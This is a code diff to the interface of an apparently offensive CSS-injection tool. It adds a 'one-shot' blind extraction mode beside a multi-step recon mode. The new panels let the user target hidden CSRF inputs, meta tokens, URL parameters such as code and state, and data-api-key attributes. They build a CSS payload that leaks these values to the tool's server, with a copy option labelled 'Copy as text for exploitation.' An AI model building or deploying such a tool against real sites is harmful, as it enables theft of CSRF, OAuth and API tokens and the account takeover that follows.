@@ -147,7 +147,9 @@
 
   .mode-switch { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
   .mode-switch .btn { min-width: 120px; }
-  .hidden-mode { display: none !important; }
+  .hidden-mode, .hidden-method { display: none !important; }
+  .method-switch { margin-top: -4px; }
+  .method-switch .btn { min-width: 0; padding: 6px 14px; font-size: 11px; }
   .targets { display: flex; gap: 16px; flex-wrap: wrap; font-size: 13px; margin-bottom: 12px; }
   .targets label, .field-row label { cursor: pointer; }
   .field-row { display: flex; gap: 12px; align-items: center; font-size: 13px; padding: 4px 0; border-bottom: 1px solid #1a1a1a; }
@@ -253,7 +255,61 @@
     <div class="token-box" id="sampleToken">-</div>
   </div>
 
-  <div class="panel blind-only hidden-mode">
+  <div class="mode-switch method-switch blind-only hidden-mode">
+    <button class="btn" id="methodOneShot">one-shot</button>
+    <button class="btn btn-outline" id="methodRecon">recon (multi-step)</button>
+  </div>
+  <div class="note blind-only hidden-mode" id="methodNote" style="text-align:center;margin:-8px 0 16px"></div>
+
+  <div class="panel blind-only one-shot-only hidden-mode">
+    <div class="panel-header">one-shot blind extraction</div>
+    <div class="targets">
+      <label><input type="checkbox" class="one-shot-target" value="input" checked> hidden inputs</label>
+      <label><input type="checkbox" class="one-shot-target" value="meta"> meta[content]</label>
+      <label><input type="checkbox" class="one-shot-target" value="url"> URL params</label>
+      <label><input type="checkbox" class="one-shot-target" value="data"> data-* attributes</label>
+    </div>
+    <div class="config-row">
+      <span class="config-label">inputs</span>
+      <input id="oneShotInputNames" class="config-input" value="csrf, csrf_token, token, authenticity_token, nonce" aria-label="Hidden input names">
+    </div>
+    <div class="config-row">
+      <span class="config-label">meta</span>
+      <input id="oneShotMetaNames" class="config-input" value="csrf-token, csrf, token, nonce" aria-label="Meta names">
+    </div>
+    <div class="config-row">
+      <span class="config-label">params</span>
+      <input id="oneShotUrlNames" class="config-input" value="token, code, state, key, csrf" aria-label="URL parameter names">
+    </div>
+    <div class="config-row">
+      <span class="config-label">URL</span>
+      <select id="oneShotUrlKinds" class="config-input">
+        <option value="a">links</option><option value="form">form actions</option><option value="a,form">both</option>
+      </select>
+      <select id="oneShotUrlCharset" class="config-input">
+        <option value="hex">hex</option><option value="alnum">alphanumeric</option>
+        <option value="base64">base64</option><option value="base64url">base64url</option>
+      </select>
+      <select id="oneShotUrlWindow" class="config-input short">
+        <option value="4">4 chars</option><option value="3">3 chars</option>
+      </select>
+    </div>
+    <div class="config-row">
+      <span class="config-label">data-*</span>
+      <input id="oneShotDataNames" class="config-input" value="data-csrf-token, data-token, data-api-key, data-nonce, data-key" aria-label="Data attribute names">
+    </div>
+    <div class="actions">
+      <select id="oneShotCopyMode" class="config-input" style="flex:none;width:220px">
+        <option value="test">Copy as HTML for test</option>
+        <option value="exploit">Copy as text for exploitation</option>
+      </select>
+      <button class="btn" id="oneShotCopyBtn">copy one-shot payload</button>
+      <span class="status" id="oneShotCopyStatus"></span>
+    </div>
+    <div class="note">Inject once. The default searches five common hidden-input names; add other targets as needed. Whole values detect their charset automatically. URL params use the selected charset. Each kind shares one extraction lane; matching names of the same kind are reported as a collision, while empty whole-value fields are ignored. Long hex values may have several candidates with one-shot's 3-character windows; use recon mode for 4-character hex windows. Large payloads can take much longer on busy pages.</div>
+  </div>
+
+  <div class="panel blind-only recon-only hidden-mode hidden-method">
     <div class="panel-header">1. recon</div>
     <div class="targets">
       <label><input type="checkbox" class="target" value="input" checked> input[value]</label>
@@ -269,10 +325,10 @@
       <button class="btn" id="reconCopyBtn">copy recon payload</button>
       <span class="status" id="reconCopyStatus"></span>
     </div>
-    <div class="note">Wordlist probes for field names, which element can host the requests, and which charset each value looks like. Inject it, then pick fields (and their charsets) below.</div>
+    <div class="note">Wordlist probes for field names, which element can host the requests, and which charset each value looks like. Inject it, then pick fields (and their charsets) below. Copying starts a fresh recon.</div>
   </div>
 
-  <div class="panel blind-only hidden-mode">
+  <div class="panel blind-only recon-only hidden-mode hidden-method">
     <div class="panel-header"><span class="indicator" id="reconDot"></span>2. discovered fields</div>
     <div id="fieldList" class="token-box muted">waiting for recon...</div>
     <div class="note">Non-hex fields always use 3-char windows plus case pairs (~4–5 MB/field).</div>
@@ -296,7 +352,7 @@
   </div>
 
   <div class="panel blind-only hidden-mode">
-    <div class="panel-header"><span class="indicator" id="blindDot"></span>3. extracted tokens</div>
+    <div class="panel-header"><span class="indicator" id="blindDot"></span>extracted tokens</div>
     <div class="token-box muted" id="blindResults">waiting for extraction...</div>
     <div style="margin-top:12px" class="actions">
       <button class="btn btn-outline" id="blindRefreshBtn">refresh</button>
@@ -611,6 +667,31 @@ function setMode(mode) {
   document.getElementById('testArea').innerHTML = mode === 'blind' ? BLIND_SAMPLE.html : (CONFIG ? CONFIG.sampleHtml : '');
 }
 
+// Blind mode offers two methods: one-shot (discovery and extraction in one
+// injection) or recon (a discovery payload, then an extract payload for the
+// fields you pick). Only the chosen method's panels are shown.
+const METHOD_NOTES = {
+  'one-shot': 'One injection: discovery and extraction together. Best for a single field per kind.',
+  recon: 'Two injections: discover fields first, then extract the ones you pick. Handles several fields of the same kind, per-field charsets and 4-char hex windows.',
+};
+let BLIND_METHOD = 'one-shot';
+function setBlindMethod(method) {
+  BLIND_METHOD = method;
+  document.querySelectorAll('.one-shot-only').forEach(e => e.classList.toggle('hidden-method', method !== 'one-shot'));
+  document.querySelectorAll('.recon-only').forEach(e => e.classList.toggle('hidden-method', method !== 'recon'));
+  document.getElementById('methodOneShot').className = 'btn' + (method === 'one-shot' ? '' : ' btn-outline');
+  document.getElementById('methodRecon').className = 'btn' + (method === 'recon' ? '' : ' btn-outline');
+  document.getElementById('methodNote').textContent = METHOD_NOTES[method];
+}
+
+async function resetBlind() {
+  await fetch('/api/blind/reset');
+  BLIND_FIELDS = [];
+  delete document.getElementById('fieldList').dataset.rendered;
+  renderFields({ status: 'waiting' });
+  renderResults({ status: 'waiting' });
+}
+
 async function copyPayload(css, mode, statusEl) {
   try {
     if (mode === 'test') await copyAsHtml(css);
@@ -692,6 +773,11 @@ function renderResults(data) {
         r.candidates.map(escapeHtml).join('<br>');
     } else if (r.status === 'ok') {
       body = escapeHtml(r.token);
+    } else if (r.status === 'ambiguous_field') {
+      body = '<span style="color:#ff0">multiple names share this extraction lane: ' +
+        r.names.map(escapeHtml).join(', ') + '. Use recon mode for these fields.</span>';
+    } else if (r.status === 'unsupported') {
+      body = '<span style="color:#ff5555">value does not fit a supported charset</span>';
     } else if (r.status === 'failed') {
       const name = CHARSET_LABELS[r.charset] || 'hex';
       body = `<span style="color:#ff5555">no ${name} token recovered (value may not be purely ${name})</span>`;
@@ -711,12 +797,65 @@ function initBlind() {
   document.getElementById('blindSample').innerText = BLIND_SAMPLE.text;
   document.getElementById('modeTargeted').addEventListener('click', () => setMode('targeted'));
   document.getElementById('modeBlind').addEventListener('click', () => setMode('blind'));
+  document.getElementById('methodOneShot').addEventListener('click', () => setBlindMethod('one-shot'));
+  document.getElementById('methodRecon').addEventListener('click', () => setBlindMethod('recon'));
+  setBlindMethod(BLIND_METHOD);
 
-  document.getElementById('reconCopyBtn').addEventListener('click', () => {
+  document.getElementById('oneShotUrlCharset').addEventListener('change', e => {
+    const windowSelect = document.getElementById('oneShotUrlWindow');
+    const hex = e.target.value === 'hex';
+    windowSelect.querySelector('option[value="4"]').disabled = !hex;
+    if (!hex) windowSelect.value = '3';
+  });
+
+  document.getElementById('oneShotCopyBtn').addEventListener('click', async () => {
+    const status = document.getElementById('oneShotCopyStatus');
+    const names = id => document.getElementById(id).value.split(',').map(s => s.trim()).filter(Boolean);
+    const cfg = {
+      targets: [...document.querySelectorAll('.one-shot-target:checked')].map(e => e.value),
+      inputNames: names('oneShotInputNames'),
+      metaNames: names('oneShotMetaNames'),
+      urlNames: names('oneShotUrlNames'),
+      urlKinds: document.getElementById('oneShotUrlKinds').value.split(','),
+      dataNames: names('oneShotDataNames'),
+      urlCharset: document.getElementById('oneShotUrlCharset').value,
+      urlWindow: Number(document.getElementById('oneShotUrlWindow').value),
+    };
+    if (!cfg.targets.length) {
+      status.textContent = 'pick at least one target';
+      return;
+    }
+    status.textContent = 'building payload...';
+    try {
+      const res = await fetch('/api/blind/one-shot', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(cfg),
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'configuration failed');
+      const css = FragBlind.generateOneShotCSS(data.fields, cfg, window.location.origin);
+      renderResults({ status: 'waiting' });
+      await copyPayload(css, document.getElementById('oneShotCopyMode').value, status);
+    } catch (error) {
+      status.textContent = error.message || 'could not build payload';
+      status.className = 'status';
+    }
+  });
+
+  document.getElementById('reconCopyBtn').addEventListener('click', async () => {
     const targets = [...document.querySelectorAll('.target:checked')].map(e => e.value);
     const status = document.getElementById('reconCopyStatus');
     if (!targets.length) {
       status.textContent = 'pick at least one target';
+      status.className = 'status';
+      return;
+    }
+    // A new recon starts a fresh multi-step flow. This also takes the server
+    // out of one-shot mode, which would otherwise keep recon hits across
+    // gaps and solve with one-shot's shared lanes.
+    try {
+      await resetBlind();
+    } catch {
+      status.textContent = 'could not reset the server';
       status.className = 'status';
       return;
     }
@@ -752,13 +891,7 @@ function initBlind() {
   });
 
   document.getElementById('blindRefreshBtn').addEventListener('click', () => { checkRecon(); checkBlindTokens(); });
-  document.getElementById('blindResetBtn').addEventListener('click', async () => {
-    await fetch('/api/blind/reset');
-    BLIND_FIELDS = [];
-    delete document.getElementById('fieldList').dataset.rendered;
-    renderFields({ status: 'waiting' });
-    renderResults({ status: 'waiting' });
-  });
+  document.getElementById('blindResetBtn').addEventListener('click', resetBlind);
 
   setInterval(() => {
     if (MODE !== 'blind') return;
